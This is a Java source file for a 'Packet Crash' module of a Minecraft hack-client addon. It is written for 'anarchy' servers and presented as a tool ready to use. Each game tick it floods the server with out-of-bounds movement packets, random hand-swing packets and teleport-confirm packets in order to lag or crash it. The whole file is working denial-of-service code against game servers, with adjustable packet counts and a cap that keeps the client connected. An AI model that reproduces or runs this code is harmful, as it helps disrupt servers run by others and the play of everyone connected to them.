package kassuk.addon.blackout.modules.anarchy;

import kassuk.addon.blackout.BlackOut;
import meteordevelopment.meteorclient.events.packets.PacketEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import meteordevelopment.orbit.EventPriority;
import net.minecraft.network.packet.c2s.play.HandSwingC2SPacket;
import net.minecraft.network.packet.c2s.play.KeepAliveC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.network.packet.c2s.play.TeleportConfirmC2SPacket;
import net.minecraft.util.Hand;

import java.util.Random;

/*
Made by OLEPOSSU / Raksamies and KassuK
*/

public class PacketCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();
    private final Setting<Boolean> bounds = sgGeneral.add(new BoolSetting.Builder()
        .name("Out Of Bounds")
        .description(".")
        .defaultValue(true)
        .build()
    );
    private final Setting<Integer> boundsAmount = sgGeneral.add(new IntSetting.Builder()
        .name("Bounds Amount")
        .description(".")
        .defaultValue(10)
        .range(0, 100)
        .sliderMax(100)
        .visible(bounds::get)
        .build()
    );
    private final Setting<Integer> boundsDist = sgGeneral.add(new IntSetting.Builder()
        .name("Bounds Dist")
        .description(".")
        .defaultValue(1337)
        .sliderRange(-1337, 1337)
        .visible(bounds::get)
        .build()
    );
    private final Setting<Boolean> swing = sgGeneral.add(new BoolSetting.Builder()
        .name("Swing")
        .description(".")
        .defaultValue(true)
        .build()
    );
    private final Setting<Integer> swingAmount = sgGeneral.add(new IntSetting.Builder()
        .name("Swing Amount")
        .description("Per tick.")
        .defaultValue(5)
        .sliderRange(0, 100)
        .visible(swing::get)
        .build()
    );
    private final Setting<Boolean> confirm = sgGeneral.add(new BoolSetting.Builder()
        .name("Confirm")
        .description(".")
        .defaultValue(true)
        .build()
    );
    private final Setting<Integer> confirmAmount = sgGeneral.add(new IntSetting.Builder()
        .name("Confirm Amount")
        .description("Per tick.")
        .defaultValue(5)
        .sliderRange(0, 100)
        .visible(swing::get)
        .build()
    );
    private final Setting<Integer> forceLimit = sgGeneral.add(new IntSetting.Builder()
        .name("Limit")
        .description(".")
        .defaultValue(500)
        .sliderMax(1000)
        .build()
    );
    int rur = 0;
    int sent = 0;
    String info = "Packets: ";
    Random r = new Random();

    public PacketCrash() {
        super(BlackOut.ANARCHY, "Packet Crash", "Sends packets");
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    private void onTick(TickEvent.Pre event) {
        if (mc.player != null && mc.world != null) {
            rur++;
            if (rur % 20 == 0) {
                info = sent > forceLimit.get() ? forceLimit.get() + " (" + sent + ")" : String.valueOf(sent);
                sent = 0;
            }
            if (bounds.get()) {
                sendBounds(boundsAmount.get());
            }
            if (swing.get()) {
                sendSwings(swingAmount.get());
            }
            if (confirm.get()) {
                sendConfirms(confirmAmount.get());
            }
        }
    }
    @EventHandler
    private void onSend(PacketEvent.Send e) {
        sent++;
        if (sent >= forceLimit.get() && !(e.packet instanceof KeepAliveC2SPacket)) {
            e.cancel();
        }
    }
    @Override
    public String getInfoString() {
        return info;
    }
    private void sendBounds(int amount) {
        for (int i = 0; i < amount; i++) {
            float x = (float) Math.cos(Math.toRadians(r.nextFloat() * 360 + 90));
            float z = (float) Math.sin(Math.toRadians(r.nextFloat() * 360 + 90));
            mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(mc.player.getX() + x * boundsDist.get(), mc.player.getY(), mc.player.getX() + z * boundsDist.get(), mc.player.isOnGround()));
        }
    }
    private void sendSwings(int amount) {
        for (int i = 0; i < amount; i++) {
            mc.player.networkHandler.sendPacket(new HandSwingC2SPacket(Math.round(r.nextFloat()) == 0 ? Hand.MAIN_HAND : Hand.OFF_HAND));
        }
    }
    private void sendConfirms(int amount) {
        for (int i = 0; i < amount; i++) {
            mc.player.networkHandler.sendPacket(new TeleportConfirmC2SPacket(sent));
        }
    }
}
